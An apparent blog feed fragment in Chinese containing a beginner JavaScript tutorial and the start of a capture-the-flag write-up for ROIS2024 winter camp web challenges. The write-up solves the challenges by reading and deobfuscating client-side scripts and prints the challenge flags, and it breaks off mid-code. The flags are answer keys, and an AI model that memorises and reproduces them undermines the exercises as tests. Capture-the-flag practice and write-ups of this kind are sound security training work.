class="string">multi-line</span></span><br><span class="line"><span class="string">string.`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(multiLine);</span><br></pre></td></tr></table></figure><blockquote><p>输出:<br>This is a<br>multi-line<br>string.</p></blockquote><p>在上面的例子中，模板字面量可以直接包含换行符，而不需要使用 <code>\n</code> 转义字符。</p><p>3.嵌套模板字面量：您可以在模板字面量中嵌套其他模板字面量，以构建更复杂的字符串。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nestedTemplate = <span class="string">`Hello, <span class="subst">$&#123;<span class="string">`My name is <span class="subst">$&#123;name&#125;</span>`</span>&#125;</span>.`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nestedTemplate); <span class="comment">// 输出 &quot;Hello, My name is John.&quot;</span></span><br></pre></td></tr></table></figure><p>在上面的例子中，<code>$&#123;name&#125;</code> 是嵌套在外部模板字面量中的。</p><h3 id="字符串包含引号"><a href="#字符串包含引号" class="headerlink" title="字符串包含引号"></a>字符串包含引号</h3><p>要实现字符串:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">She said &quot;I think so!&quot;</span><br></pre></td></tr></table></figure><p>此时不能再使用<code>&quot;&quot;</code>,一种常见的方法是换用其他字符来声明字符串：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> goodQuotes1 = <span class="string">&#x27;She said &quot;I think so!&quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> goodQuotes2 = <span class="string">`She said &quot;I think so!&quot;`</span>;</span><br></pre></td></tr></table></figure><p>另一种选择是<strong>转义</strong>存在问题的引号。转义字符意味着我们对它们做了一些处理，以确保它们被识别为文本，而不是代码的一部分。在 JavaScript 中，我们通过在字符之前加上反斜杠(<code>\</code>)来实现这一点。</p><h3 id="操作字符串"><a href="#操作字符串" class="headerlink" title="操作字符串"></a>操作字符串</h3><p>把字符串当作对象，就可以有大量的原型和方法编辑它。以下为常用的属性和操作</p><h4 id="获得字符串的长度"><a href="#获得字符串的长度" class="headerlink" title="获得字符串的长度"></a>获得字符串的长度</h4><p>这很简单 — 你可以很轻松的使用 <code>length</code>属性。尝试输入以下的两行代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> browserType = <span class="string">&quot;mozilla&quot;</span>;</span><br><span class="line">browserType.<span class="property">length</span>;</span><br></pre></td></tr></table></figure><p>因为”mozilla”的长度为 7 个字符,这个结果应该返回一个数字：7。说字符串的长度有用是有很多原因的，例如，你可能想算出一连串名字的长度，并用名字长度来作为名字排序的依据，亦或让一个用户知道他输入的用户名太长，已经超出了输入的字符串长度限制。</p><h4 id="检索特定字符串字符"><a href="#检索特定字符串字符" class="headerlink" title="检索特定字符串字符"></a>检索特定字符串字符</h4><p>可以使用方括号表示法(在变量名的末尾包含方括号<code>[ ]</code>)返回字符串中的任何字符.例如，要检索第一个字母，可以这样做：(如同数组)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserType[0];</span><br></pre></td></tr></table></figure><h4 id="在字符串中查找子字符串并提取它"><a href="#在字符串中查找子字符串并提取它" class="headerlink" title="在字符串中查找子字符串并提取它"></a>在字符串中查找子字符串并提取它</h4><p>有时候你会想要找出一个较小的字符串是否存在于一个较大的字符串中（我们通常会说一个字符串中存在一个子字符串）。这可以使用<code>indexOf()</code>方法来完成，该方法需要一个parameter (en-US)— 你想要搜索的子字符串。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserType.<span class="title function_">indexOf</span>(<span class="string">&quot;zilla&quot;</span>);</span><br></pre></td></tr></table></figure><p>返回的结果是子字符串起始的位置（原字符串第一个字母为0），若无结果将返回<code>-1</code></p><h4 id="转换大小写"><a href="#转换大小写" class="headerlink" title="转换大小写"></a>转换大小写</h4><p>字符串方法<code>toLowerCase()</code>和<code>toUpperCase()</code>字符串并将所有字符分别转换为小写或大写。</p><h4 id="替换字符串的某部分"><a href="#替换字符串的某部分" class="headerlink" title="替换字符串的某部分"></a>替换字符串的某部分</h4><p>使用<code>replace()</code>方法将字符串中的一个子字符串替换为另一个子字符串。</p><p>它需要两个参数 - 要被替换下的字符串和要被替换上的字符串。</p><h2 id="数组-1"><a href="#数组-1" class="headerlink" title="数组"></a>数组</h2><h3 id="获取数组长度"><a href="#获取数组长度" class="headerlink" title="获取数组长度"></a>获取数组长度</h3><p>使用 <code>length</code>属性获取数组的长度（数组中有多少项元素）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sequence = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>];</span><br><span class="line">sequence.<span class="property">length</span>;<span class="comment">// 将返回7</span></span><br></pre></td></tr></table></figure><h3 id="字符串与数组转换"><a href="#字符串与数组转换" class="headerlink" title="字符串与数组转换"></a>字符串与数组转换</h3><p>将数组看作成对象，可使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/split"><code>split()</code></a> 方法将一个长长的字符串中的原始数据，分成更有用的数据，存储在数组中，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myData = <span class="string">&quot;Manchester,London,Liverpool,Birmingham,Leeds,Carlisle&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> myArray = myData.<span class="title function_">split</span>(<span class="string">&quot;,&quot;</span>);<span class="comment">//以，号来隔开</span></span><br><span class="line">myArray;<span class="comment">//输出[&#x27;Manchester&#x27;, &#x27;London&#x27;, &#x27;Liverpool&#x27;, &#x27;Birmingham&#x27;, &#x27;Leeds&#x27;, &#x27;Carlisle&#x27;]</span></span><br></pre></td></tr></table></figure><p>也可以使用 <code>join()</code>方法进行<strong>相反的操作</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myNewString = myArray.<span class="title function_">join</span>(<span class="string">&quot;,&quot;</span>);<span class="comment">//以，进行连接</span></span><br><span class="line">myNewString;<span class="comment">//输出 &#x27;Manchester,London,Liverpool,Birmingham,Leeds,Carlisle&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="添加和删除数组项"><a href="#添加和删除数组项" class="headerlink" title="添加和删除数组项"></a>添加和删除数组项</h3><p><strong>可以使用 <code>push()</code> 方法，在数组末尾添加项目</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myArray.<span class="title function_">push</span>(<span class="string">&quot;Cardiff&quot;</span>);<span class="comment">//增加一个</span></span><br><span class="line">myArray.<span class="title function_">push</span>(<span class="string">&quot;Bradford&quot;</span>, <span class="string">&quot;Brighton&quot;</span>);<span class="comment">//增加两个</span></span><br></pre></td></tr></table></figure><p>​当方法调用完成时，将<strong>返回值为数组的新长度</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> newLength = myArray.<span class="title function_">push</span>(<span class="string">&quot;Bristol&quot;</span>);<span class="comment">//newLength为一个值</span></span><br></pre></td></tr></table></figure><p><strong>可以使用 <code>pop()</code>方法，在数组末尾删除一个项目</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myArray.<span class="title function_">pop</span>();</span><br></pre></td></tr></table></figure><p>​当方法调用完成时，将<strong>返回值已删除的项目</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> removedItem = myArray.<span class="title function_">pop</span>();<span class="comment">//removedItem为被删除的元素</span></span><br></pre></td></tr></table></figure><p>除此之外，还有<code>unshift()</code> 和 <code>shift()</code> 的方法分别作用于数组的开始进行添加或者删除元素，返回值与 <code>push()</code> 和 <code>pop()</code>方法相同</p><h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><h3 id="if…else-语法"><a href="#if…else-语法" class="headerlink" title="if…else 语法"></a>if…else 语法</h3><p>基本的 <code>if...else</code> 语法看起来这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">  <span class="comment">/* 条件为真时运行的代码 */</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">/* 否则，运行其他的代码 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加<code>&#123;&#125;</code>时，内可以添加多个语句，没有<code>&#123;&#125;</code>时，只会运行<code>if</code>下的第一个语句，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) </span><br><span class="line">  <span class="comment">/* 代码1; */</span></span><br><span class="line">  <span class="comment">/* 代码2; */</span></span><br></pre></td></tr></table></figure><p>只有条件为真时，<code>代码1</code>才会运行，不论条件是否为真，<code>代码2</code>都会运行。</p><h4 id="更多选择：else-if"><a href="#更多选择：else-if" class="headerlink" title="更多选择：else if"></a>更多选择：<code>else if</code></h4><p>使用 <code>else if</code>可以使判断更多的条件和选项，例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition1) &#123;</span><br><span class="line">  <span class="comment">/* 条件1为真时运行的代码 */</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition2) &#123;</span><br><span class="line">  <span class="comment">/* 条件2为真时运行的代码 */</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition3) &#123;</span><br><span class="line">  <span class="comment">/* 条件3为真时运行的代码 */</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">/* 否则，运行其他的代码 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="switch-语句"><a href="#switch-语句" class="headerlink" title="switch 语句"></a><code>switch</code> 语句</h3><p><strong>语法</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (表达式/值) &#123;</span><br><span class="line">  <span class="keyword">case</span> 选择<span class="number">1</span>:</span><br><span class="line">    运行这段代码</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> 选择<span class="number">2</span>:</span><br><span class="line">    否则，运行这段代码</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// .......其他情况</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">default</span>:</span><br><span class="line">    出现未定义时的情况下，运行这段代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><ol><li><code>switch</code>后的括号内可以是<strong>表达式或值</strong>。</li><li><code>default</code> 之后不需要再有选项，并且不需要 <code>break</code> 语句，因为之后没有任何运行代码。如果之前没有选项匹配，则运行 <code>default</code> 选项。</li></ol><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a><code>for</code>循环</h3><p><strong>语法</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始化操作; 开始/继续循环条件; 每次循环结束后的操作) &#123;</span><br><span class="line">  <span class="comment">// 每次循环运行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在关键字<code>for</code>括号内，我们有三个项目，以分号分隔：</p><ol><li><p>一个<strong>初始化器</strong> - 这通常是一个设置为一个数字的变量，它被递增来计算循环运行的次数。它也有时被称为<strong>计数变量</strong>。</p></li><li><p>一个<strong>开始&#x2F;继续循环条件</strong> - 如前面提到的，这个定义循环何时停止循环。这通常是一个表现为比较运算符的表达式，用于查看退出条件是否已满足的测试。</p></li><li><p>一个<strong>循环结束后的操作</strong> - 这总是被判断（或运行），每个循环已经通过一个完整的迭代消失时间。它通常用于增加（或在某些情况下递减）计数器变量，使其更接近退出条件值。</p></li></ol><h3 id="while-语句"><a href="#while-语句" class="headerlink" title="while 语句"></a><code>while</code> 语句</h3><p><strong>语法</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (开始/继续循环条件) &#123;</span><br><span class="line">  <span class="comment">// 每次循环运行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="do-while-语句"><a href="#do-while-语句" class="headerlink" title="do ... while 语句"></a><code>do ... while</code> 语句</h3><p><strong>语法</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="comment">// 每次循环运行的代码</span></span><br><span class="line">&#125; <span class="keyword">while</span> (继续循环条件)</span><br></pre></td></tr></table></figure><p>与<code>while</code> 循环不同的是<code>do...while</code> 循环会<strong>先进行一次循环</strong>然后再判断条件满不满足循环的条件决定是否继续循环</p><h3 id="跳出循环"><a href="#跳出循环" class="headerlink" title="跳出循环"></a>跳出循环</h3><h4 id="break-语句"><a href="#break-语句" class="headerlink" title="break 语句"></a><code>break</code> 语句</h4><p>使用<code>break</code> 语句将立即退出本层循环</p><h4 id="continue-语句"><a href="#continue-语句" class="headerlink" title="continue 语句"></a><code>continue</code> 语句</h4><p><code>continue</code> 语句与<code>break</code>类似，但不是完全跳出循环，而是<strong>跳过本次循环</strong><code>continue</code> 语句后的余下代码，<strong>条件成立的话执行下一个循环</strong>。</p><p>在<code>for</code>循环语句中，使用<code>continue</code>语句，<strong>跳过本次循环</strong><code>continue</code> 语句后的余下代码，<strong>仍然会进行<code>每次循环结束后的操作</code>的代码</strong></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数声明自定义函数"><a href="#函数声明自定义函数" class="headerlink" title="函数声明自定义函数"></a>函数声明自定义函数</h3><p><strong>语法</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">functionName</span>(<span class="params">parameters</span>) &#123;</span><br><span class="line">  <span class="comment">// 函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：形参在<code>()</code>无需再使用<code>let</code>或者<code>var</code>声明，直接输入参数名即可</p><h3 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h3><p><strong>语法</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">functionName</span>(parameters)</span><br></pre></td></tr></table></figure><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>创建一个<strong>没有名称的函数</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数叫做<strong>匿名函数</strong>——它没有函数名！它也不会自己做任何事情。通常将匿名函数与事件处理程序或者将匿名函数分配为变量的值一起使用。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myButton = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;button&quot;</span>);</span><br><span class="line"></span><br><span class="line">myButton.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;  <span class="comment">//将匿名函数与事件处理程序一起使用</span></span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myGreeting = <span class="keyword">function</span> (<span class="params"></span>) &#123;  <span class="comment">//将匿名函数分配为变量的值</span></span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p><strong>函数内</strong>定义的变量和其他东西作用域仅在函数内，不能被函数外的代码访问。</p><p>假设一个 HTML 文件，它调用两个外部 JavaScript 文件，并且它们<strong>都有一个使用相同名称定义的变量和函数</strong>，若调用这个函数，只能访问到首先被引用文件的这个函数（第二个文件被忽视了），例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Excerpt from my HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;first.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;second.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  greeting();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// first.js</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;Chris&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greeting</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;Hello &quot;</span> + name + <span class="string">&quot;: welcome to our company.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//偷懒写在一起了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// second.js</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;Zaptec&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greeting</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;Our company is called &quot;</span> + name + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个函数都使用 <code>greeting()</code> 形式调用，但是你只能访问到 first.js 文件的<code>greeting()</code>函数（第二个文件被忽视了）。另外，第二次尝试使用 <code>let</code> 关键字定义 <code>name</code> 变量导致了一个错误。</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>函数的返回值可以是<strong>任意类型的数据</strong>，例如数组、对象等数据类型</p><h1 id="一些函数和方法"><a href="#一些函数和方法" class="headerlink" title="一些函数和方法"></a><strong>一些函数和方法</strong></h1><h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><h3 id="1-Number-函数"><a href="#1-Number-函数" class="headerlink" title="1.Number()函数"></a>1.<code>Number()</code>函数</h3><p>​将其参数转换为数字</p><h3 id="2-String-函数"><a href="#2-String-函数" class="headerlink" title="2.String()函数"></a>2.<code>String()</code>函数</h3><p>​将其参数转换为字符串</p><h3 id="3-Math-random"><a href="#3-Math-random" class="headerlink" title="3.Math.random()"></a>3.Math.random()</h3><p><strong>Math.random()是令系统随机选取大于等于 0.0 且小于 1.0 的伪随机 double 值</strong></p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="3-Window：alert-方法"><a href="#3-Window：alert-方法" class="headerlink" title="3.Window：alert() 方法"></a>3.Window：alert() 方法</h3><p><code>window.alert()</code> 令浏览器显示一个带有可选的信息的对话框，并等待用户离开该对话框。</p><p>在某些情况下（例如，当用户切换标签时）浏览器可能不会实际显示一个对话框，或者不等待用户离开对话框。</p><p><strong>语法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert()</span><br><span class="line">alert(message)</span><br></pre></td></tr></table></figure><p><strong>参数</strong></p><ul><li><p><code>message</code>可选</p><p>是要显示在警告对话框中的字符串，如果传入其他类型的值，会转换成字符串。</p></li></ul><p>返回值：无</p><p>完整内置对象以及其相关方法列表</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects">JavaScript 标准内置对象 - JavaScript | MDN (mozilla.org)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;JavaScript 是一种可插入 HTML 页面的轻量级的编程语言。&lt;/p&gt;
&lt;h1 id=&quot;初识JavaScript&quot;&gt;&lt;a href=&quot;#初识JavaScript&quot; class=&quot;headerlink&quot; title=&quot;初识JavaScript&quot;&gt;&lt;/a&gt;&lt;strong</summary>
      
    
    
    
    <category term="编程" scheme="https://we11s.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="开发" scheme="https://we11s.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>ROIS2024冬令营</title>
    <link href="https://we11s.github.io/posts/3320244556/"/>
    <id>https://we11s.github.io/posts/3320244556/</id>
    <published>2024-01-27T07:42:07.000Z</published>
    <updated>2024-03-12T16:27:44.904Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-vue-terminal"><a href="#1-vue-terminal" class="headerlink" title="1.vue-terminal"></a>1.vue-terminal</h3><p><strong>解法一</strong>：</p><p>​老老实实用<code>cd</code>、<code>ls</code>、<code>cat</code>命令一步步找出下一个url</p><p><strong>解法二</strong>：</p><p>​直接找网页源码，无后端，所以flag在前端文件里，一通瞎找最后在<code>app.2fa07618.js</code>找到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">                   <span class="title function_">onExecCmd</span>(<span class="params">n, e, t, o</span>) &#123;</span><br><span class="line">                       <span class="string">&quot;flag&quot;</span> === n ? <span class="title function_">t</span>(&#123;</span><br><span class="line">                           <span class="attr">type</span>: <span class="string">&quot;html&quot;</span>,</span><br><span class="line">                           <span class="attr">content</span>: <span class="string">&#x27;\n        &lt;ul class=&quot;custom-content&quot;&gt;\n          &lt;li class=&quot;t-dir&quot;&gt;flag: ROIS&#123;just_a_simple_linux_command_in_CTF&#125;&lt;/li&gt;\n        &lt;/ul&gt;\n        &lt;br&gt;\n        &#x27;</span></span><br><span class="line">                       &#125;) : <span class="title function_">o</span>(<span class="string">&quot;Unknown command&quot;</span>)</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure><h3 id="2-ez-maze"><a href="#2-ez-maze" class="headerlink" title="2.ez_maze"></a>2.ez_maze</h3><blockquote><p>你能通关大土豆写的网页迷宫吗？<br>小土豆想看看源代码摸索摸索门道，但是这是什么？？</p></blockquote><p><strong>解法一</strong>：</p><p>​如果不进行反混淆的话会发现这样一个常量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const flag = &#x27;ROIS&#123;Its_&#x27; + _0x2e725b(0x180) + _0x2e725b(0x17a) + _0x2e725b(0x16a);</span><br></pre></td></tr></table></figure><p>​直接在浏览器控制台输入flag这个常量，就会出现所对应的值</p><p><strong>解法二</strong>：</p><p>​看到js这么一大坨类似乱码的，肯定是经过了混淆处理的，直接拖到反混淆工具里去（<a href="https://dev-coco.github.io/Online-Tools/JavaScript-Deobfuscator.html">JavaScript Deobfuscator (dev-coco.github.io)</a>），最后在一串的代码中找到了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const flag = &#x27;ROIS&#123;Its_fun_to_play_maze_with_js!&#125;&#x27;;</span><br></pre></td></tr></table></figure><p><strong>解法三</strong>：</p><p>​由于是纯前端文件，所以也可以修改js代码实现弹出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">movePlayer</span>(<span class="params">_0x2fa2ec, _0x1d96bc</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> _0x4c26cf = _0x2e725b,</span><br><span class="line">_0x45acd1 = <span class="title class_">Math</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x177</span>)](_0x1d96bc / cellSize),</span><br><span class="line">_0x118e43 = <span class="title class_">Math</span>[<span class="string">&#x27;floor&#x27;</span>](_0x2fa2ec / cellSize);</span><br><span class="line"><span class="keyword">if</span> (maze[_0x45acd1][_0x118e43] === <span class="number">0x1</span>) <span class="title function_">alert</span>(<span class="title function_">_0x4c26cf</span>(<span class="number">0x173</span>)), <span class="title function_">resetGame</span>(), <span class="variable language_">window</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x168</span>)][<span class="title function_">_0x4c26cf</span>(<span class="number">0x164</span>)] = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> maze[_0x45acd1][_0x118e43] === <span class="number">0x2</span> ? (<span class="title function_">alert</span>(<span class="title function_">_0x4c26cf</span>(<span class="number">0x16e</span>) + flag), <span class="title function_">resetGame</span>(), <span class="variable language_">window</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x168</span>)][<span class="string">&#x27;href&#x27;</span>] = <span class="string">&#x27;/&#x27;</span>) : (playerX = _0x118e43 * cellSize, playerY = _0x45acd1 * cellSize, <span class="title function_">clearCanvas</span>(), <span class="title function_">drawMaze</span>(), <span class="title function_">drawPlayer</span>(playerX, playerY));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是关于flag弹出的代码，重点在后面一个else上，有一个三元运算符<code>：？</code>进行条件的判定</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> maze[_0x45acd1][_0x118e43] === <span class="number">0x2</span> ? (<span class="title function_">alert</span>(<span class="title function_">_0x4c26cf</span>(<span class="number">0x16e</span>) + flag), <span class="title function_">resetGame</span>(), <span class="variable language_">window</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x168</span>)][<span class="string">&#x27;href&#x27;</span>] = <span class="string">&#x27;/&#x27;</span>) : (playerX = _0x118e43 * cellSize, playerY = _0x45acd1 * cellSize, <span class="title function_">clearCanvas</span>(), <span class="title function_">drawMaze</span>(), <span class="title function_">drawPlayer</span>(playerX, playerY));</span><br></pre></td></tr></table></figure><p>直接爆改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 